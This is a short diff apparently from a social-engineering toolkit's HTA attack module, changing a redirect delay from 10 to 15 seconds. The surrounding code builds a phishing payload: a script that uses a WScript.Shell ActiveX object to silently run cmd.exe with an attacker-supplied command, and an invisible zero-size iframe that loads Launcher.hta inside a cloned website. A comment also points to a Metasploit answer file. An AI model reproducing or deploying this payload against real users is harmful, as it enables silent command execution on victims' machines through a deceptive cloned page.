@@ -39,7 +39,7 @@ def gen_hta_cool_stuff():
     # grab cloned website
     url = fetch_template()
     main1 = ("""<script>\na=new ActiveXObject("WScript.Shell");\na.run('%%windir%%\\\\System32\\\\cmd.exe /c %s', 0);window.close();\n</script>""" % (command))
-    main2 = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\n<script type="text/javascript">setTimeout(function(){window.location.href="%s";}, 10000);</script>""" % url)
+    main2 = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\n<script type="text/javascript">setTimeout(function(){window.location.href="%s";}, 15000);</script>""" % url)
 
     # metasploit answer file here
     filewrite = open(setdir + "/meta_config", "w")
